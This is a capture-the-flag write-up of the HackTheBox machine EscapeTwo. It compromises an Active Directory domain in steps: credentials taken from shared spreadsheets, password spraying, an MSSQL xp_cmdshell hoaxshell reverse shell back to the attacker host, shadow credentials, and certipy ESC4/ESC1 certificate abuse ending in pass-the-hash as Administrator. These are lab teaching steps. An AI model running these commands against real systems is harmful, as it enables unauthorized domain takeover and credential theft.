---
title: "EscapeTwo HackTheBox" 
date: 2025-07-24 06:00:00 0000+
tags: [WriteUp, EscapeTwo, HTB, Enumeration, Active Directory, ADCS, MSSQL, password reuse, Bloodhound, Rusthound-CE, Password Spraying, ESC4, ESC1, PTH, Privilege Escalation, Windows]
categories: [WriteUps, HackTheBox]
image:
  path: /assets/images/EscapeTwo_HTB/preview_escapetwo.png
---
# EscapeTwo HTB Writeup

EscapeTwo is a easy machine on HackTheBox which is based on an assumed breach scenario which means we have valid credentials, connecting to a SMB share reveals some of the password which helps us connecting to the MSSQL client in which xp_cmdshell can be enabled giving us shell on the box. Upon further enumeration on the box reveals the password of another user with the help of password spray to login as him and then moving laterally in our AD environment, got ownership of the CERT PUBLISHERS group enabling us to do an ESC4 which again helps us to do ESC1 and then authenticate as an administrator to pwn this machine.

![image.png](/assets/images/EscapeTwo_HTB/image.png)

## Initial Enumeration

As always we are gonna start off with the rustmap to find the open ports and services on the box.

```bash
rustmap.py -ip 10.129.232.128
```

![image.png](/assets/images/EscapeTwo_HTB/image%201.png)

![image.png](/assets/images/EscapeTwo_HTB/image%202.png)

We observed that the hostname and the domain is DC01.sequel.htb

Also Kerberos clock is only 6 secs ahead to able to sync the changes and also this is an active directory box.

### SMB Enumeration

Lets start with the SMB enumeration as ports 139 and 445 are open on the box.

```bash
nxc smb 10.129.232.128 -u 'rose' -p 'KxEPkKe6R8su'
```

![image.png](/assets/images/EscapeTwo_HTB/image%203.png)

Now lets enumerate shares on the box.

```bash
nxc smb 10.129.232.128 -u 'rose' -p 'KxEPkKe6R8su' --shares
```

![image.png](/assets/images/EscapeTwo_HTB/image%204.png)

We have two shares available to READ, looking at the **Accounting Department** share.

```bash
smbclient //sequel.htb/"Accounting Department" 'rose'%'KxEPkKe6R8su'
```

![image.png](/assets/images/EscapeTwo_HTB/image%205.png)

There is also a **Users** share which we can access but there are a lot of files in that folder, so i downloaded them and lets just keep it for future.

Looking at the two files we got from the accounting department share both of them were corrupted.

Lets just unzip both of the xlsx files.

Created a directory separate for both the xlsx files.

In the **Accounts.xlsx** directory we have an interesting xml file listing passwords of some of the users.

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="25" uniqueCount="24">
	<si><t xml:space="preserve">First Name</t></si>
	<si><t xml:space="preserve">Last Name</t></si>
	<si><t xml:space="preserve">Email</t></si>
	<si><t xml:space="preserve">Username</t></si>
	<si><t xml:space="preserve">Password</t></si>
	
	<si><t xml:space="preserve">Angela</t></si>
	<si><t xml:space="preserve">Martin</t></si>
	<si><t xml:space="preserve">angela@sequel.htb</t></si>
	<si><t xml:space="preserve">angela</t></si>
	<si><t xml:space="preserve">0fwz7Q4mSpurIt99</t></si>
	
	<si><t xml:space="preserve">Oscar</t></si>
	<si><t xml:space="preserve">Martinez</t></si>
	<si><t xml:space="preserve">oscar@sequel.htb</t></si>
	<si><t xml:space="preserve">oscar</t></si>
	<si><t xml:space="preserve">86LxLBMgEWaKUnBG</t></si>
	
	<si><t xml:space="preserve">Kevin</t></si>
	<si><t xml:space="preserve">Malone</t></si>
	<si><t xml:space="preserve">kevin@sequel.htb</t></si>
	<si><t xml:space="preserve">kevin</t></si>
	<si><t xml:space="preserve">Md9Wlq1E5bZnVDVo</t></si>
	
	<si><t xml:space="preserve">NULL</t></si>
	<si><t xml:space="preserve">sa@sequel.htb</t></si>
	<si><t xml:space="preserve">sa</t></si>
	<si><t xml:space="preserve">MSSQLP@ssw0rd!</t></si></sst>
```

Also in the **Accounting.xlsx** , after unzipping it we found a printer settings folder which could lead to the potential printer bug.

And nothing useful was found in the accounting.xlsx folder.

![image.png](/assets/images/EscapeTwo_HTB/image%206.png)

Now adding all the passwords obtained from the above xml file to the passwords.txt and proceeding with the password spray attack using NetExec.

## Exploitation

Continuing with the password spray.

```bash
nxc ldap sequel.htb -u usernames.txt -p passwords.txt --continue-on-success
```

![image.png](/assets/images/EscapeTwo_HTB/image%207.png)

Found valid creds for the user **Oscar.**

Saved credentials to the creds.txt file.

Since we have one password for SQL lets try password spray for the MSSQL accounts.

```bash
nxc mssql sequel.htb -u usernames.txt -p passwords.txt --continue-on-success --local-auth
```

![image.png](/assets/images/EscapeTwo_HTB/image%208.png)

Logging in using the impacket’s mssqlclient.py to get a shell.

```bash
impacket-mssqlclient -p 1433 sequel.htb/'sa':'MSSQLP@ssw0rd!'@sequel.htb
```

![image.png](/assets/images/EscapeTwo_HTB/image%209.png)

Trying to enable xp_cmdshell.

![image.png](/assets/images/EscapeTwo_HTB/image%2010.png)

Successfully enabled xp_cmdshell and we have code execution.

Using hoaxshell to generate a payload and get a shell on the box.

```bash
/opt/hoaxshell/hoaxshell.py -s 10.10.14.13 --port 9090
```

![image.png](/assets/images/EscapeTwo_HTB/image%2011.png)

And we have shell as **sql_svc.**

![image.png](/assets/images/EscapeTwo_HTB/image%2012.png)

Looking through the file system we have a **SQL2019** folder which contains a configuration file which contains the credentials of the **sql_svc** account.

![image.png](/assets/images/EscapeTwo_HTB/image%2013.png)

Saved this password to the passwords.txt file.

Again did a password spray on all the accounts with LDAP as the authentication.

```bash
nxc ldap sequel.htb -u usernames.txt -p passwords.txt --continue-on-success | grep '[+]'
```

![image.png](/assets/images/EscapeTwo_HTB/image%2014.png)

### Shell as Ryan

We got a new hit as **Ryan** ,the sql_svc’s account password is same as of Ryan’s.

Now lets try to check for winrm access as **Ryan.**

```bash
nxc winrm sequel.htb -u ryan -p WqSZAF6CysDQbGb3
```

![image.png](/assets/images/EscapeTwo_HTB/image%2015.png)

It says **Pwned!** which means that we have elevated privileges.

So lets WinRM into the box.

```bash
evil-winrm -i 10.129.232.128 -u 'ryan' -p 'WqSZAF6CysDQbGb3'
```

![image.png](/assets/images/EscapeTwo_HTB/image%2016.png)

And we have a shell, grabbing the user.txt file and submitting it.

### Bloodhound

Lets do a quick bloodhound enumeration, so that we get more info about the domain.

I will use RusthoundCE as the ingestor to collect data and BloodhoundCE which is running on localhost.

```bash
rusthound-ce -d sequel.htb -u 'oscar' -p '86LxLBMgEWaKUnBG' -f dc01.sequel.htb -z
```

![image.png](/assets/images/EscapeTwo_HTB/image%2017.png)

Analyzing this data in bloodhound.

![image.png](/assets/images/EscapeTwo_HTB/image%2018.png)

## Privilege Escalation

As observed in the above attack path lets try to take over on **CA_SVC** account using **BloodyAD.**

![image.png](/assets/images/EscapeTwo_HTB/image%2019.png)

```bash
bloodyAD -d sequel.htb -u 'ryan' -p 'WqSZAF6CysDQbGb3' --dc-ip 10.129.232.128 set owner 'ca_svc' 'ryan'
```

![image.png](/assets/images/EscapeTwo_HTB/image%2020.png)

Now lets take full control over **ca_svc**

```bash
bloodyAD -d sequel.htb -u 'ryan' -p 'WqSZAF6CysDQbGb3' --dc-ip 10.129.232.128 add genericAll 'ca_svc' 'ryan'
```

![image.png](/assets/images/EscapeTwo_HTB/image%2021.png)

Did ShadowCredentials attack on **CA_SVC** to get its NT hash.

```bash
bloodyAD -d sequel.htb -u 'ryan' -p 'WqSZAF6CysDQbGb3' --dc-ip 10.129.232.128 add shadowCredentials 'ca_svc'
```

![image.png](/assets/images/EscapeTwo_HTB/image%2022.png)

Saved these creds to creds.txt file.

Marking **CA_SVC** as owned! in bloodhound database.

---

Now **CA_SVC** is a member of **CERT PUBLISHERS** group which can perform ADCS

**ESC4** on the domain.

![image.png](/assets/images/EscapeTwo_HTB/image%2023.png)

### ESC4

Now using Ly4k’s certipy to find the vulnerable certificate templates.

```bash
certipy find -u 'ca_svc' -hashes '3b181b914e7a9d5508ea1e20bc2b7fce' -dc-ip '10.129.232.128' -vulnerable -text -enabled
```

The output file is:

```text
Certificate Authorities
  0
    CA Name                             : sequel-DC01-CA
    DNS Name                            : DC01.sequel.htb
    Certificate Subject                 : CN=sequel-DC01-CA, DC=sequel, DC=htb
    Certificate Serial Number           : 152DBD2D8E9C079742C0F3BFF2A211D3
    Certificate Validity Start          : 2024-06-08 16:50:40+00:00
    Certificate Validity End            : 2124-06-08 17:00:40+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : SEQUEL.HTB\Administrators
      Access Rights
        ManageCa                        : SEQUEL.HTB\Administrators
                                          SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        ManageCertificates              : SEQUEL.HTB\Administrators
                                          SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Enroll                          : SEQUEL.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : DunderMifflinAuthentication
    Display Name                        : Dunder Mifflin Authentication
    Certificate Authorities             : sequel-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireDns
                                          SubjectRequireCommonName
    Enrollment Flag                     : PublishToDs
                                          AutoEnrollment
    Extended Key Usage                  : Client Authentication
                                          Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1000 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2025-07-25T09:49:27+00:00
    Template Last Modified              : 2025-07-25T09:49:27+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : SEQUEL.HTB\Enterprise Admins
        Full Control Principals         : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Cert Publishers
        Write Owner Principals          : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Cert Publishers
        Write Dacl Principals           : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Cert Publishers
        Write Property Enroll           : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
    [+] User Enrollable Principals      : SEQUEL.HTB\Cert Publishers
    [+] User ACL Principals             : SEQUEL.HTB\Cert Publishers
    [!] Vulnerabilities
      ESC4                              : User has dangerous permissions.

```

We can see that **CERT_PUBLISHERS** can **ESC4** on **DunderMifflinAuthentication** and **CA_SVC** is part of **CERT_PUBLISHERS.**

Now lets exploit **ESC4,** we will be using certipy to exploit this.

First lets save our old template so that we can revert these changes back.

```bash
certipy template -u 'ca_svc' -hashes '3b181b914e7a9d5508ea1e20bc2b7fce' -dc-ip 10.129.232.128  -template 'DunderMifflinAuthentication' -save-configuration DMA-original
```

![image.png](/assets/images/EscapeTwo_HTB/image%2024.png)

Looking at the json file we have template config as follows.

```json
{
  "showInAdvancedViewOnly": true,
  "nTSecurityDescriptor": "HEX:0100049c3001000000000000000000001400000004001c010700000005003800300100000100000068c9100efb78d21190d400c04f79dc55010500000000000515000000bd0bb4207c08fa390ad865d00002000005003800300100000100000068c9100efb78d21190d400c04f79dc55010500000000000515000000bd0bb4207c08fa390ad865d00702000000002400ff000f00010500000000000515000000bd0bb4207c08fa390ad865d00002000000002400ff000f00010500000000000515000000bd0bb4207c08fa390ad865d00702000000002400ff000f00010500000000000515000000bd0bb4207c08fa390ad865d0f401000000002400ff010f00010500000000000515000000bd0bb4207c08fa390ad865d005020000000014009400020001010000000000050b000000010500000000000515000000bd0bb4207c08fa390ad865d007020000",
  "flags": 131680,
  "pKIDefaultKeySpec": 1,
  "pKIKeyUsage": "HEX:a000",
  "pKIMaxIssuingDepth": 0,
  "pKICriticalExtensions": [
    "2.5.29.15"
  ],
  "pKIExpirationPeriod": 31536000000,
  "pKIOverlapPeriod": 3628800,
  "pKIExtendedKeyUsage": [
    "1.3.6.1.5.5.7.3.2",
    "1.3.6.1.5.5.7.3.1"
  ],
  "pKIDefaultCSPs": [
    "1,Microsoft RSA SChannel Cryptographic Provider"
  ],
  "msPKI-RA-Signature": 0,
  "msPKI-Enrollment-Flag": 40,
  "msPKI-Private-Key-Flag": 16842752,
  "msPKI-Certificate-Name-Flag": 1207959552,
  "msPKI-Minimal-Key-Size": 2048,
  "msPKI-Certificate-Application-Policy": [
    "1.3.6.1.5.5.7.3.2",
    "1.3.6.1.5.5.7.3.1"
  ]
}
```

Now what we are gonna do next is we apply the default configuration of **ESC1** to this template to make it **ESC1**.

```bash
certipy template -u 'ca_svc' -hashes '3b181b914e7a9d5508ea1e20bc2b7fce' -dc-ip 10.129.232.128  -template 'DunderMifflinAuthentication' -write-default-configuration
```

![image.png](/assets/images/EscapeTwo_HTB/image%2025.png)

### ESC1

After writing the default configuration, we can impersonate any user in the domain to request the certificate.

So lets just impersonate the **Administrator@sequel.htb.**

```bash
certipy req -u 'ca_svc@sequel.htb' -hashes :3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip 10.129.232.128 -ca 'sequel-DC01-CA' -template 'DunderMifflinAuthentication' -dc-host 10.129.232.128 -ns 10.129.232.128-upn 'Administrator@sequel.htb'
```

![image.png](/assets/images/EscapeTwo_HTB/image%2026.png)

We successfully got the .pfx now lets just authenticate as an administrator and request its NT hash and TGT.

### Shell as Administrator

Using Certipy to request the certificate from the CA.

```bash
certipy auth -pfx administrator.pfx -dc-ip 10.129.232.128
```

![image.png](/assets/images/EscapeTwo_HTB/image%2027.png)

After getting the NT Hash we can connect to the machine by WinRM.

```bash
evil-winrm -i 10.129.232.128 -u Administrator -H 7a8d4e04986afa8ed4060f75e5a0b3ff
```

![image.png](/assets/images/EscapeTwo_HTB/image%2028.png)

Grabbing our root.txt and submitting it.

Rooted!

![image.png](/assets/images/EscapeTwo_HTB/image%2029.png)

Thanks for reading.
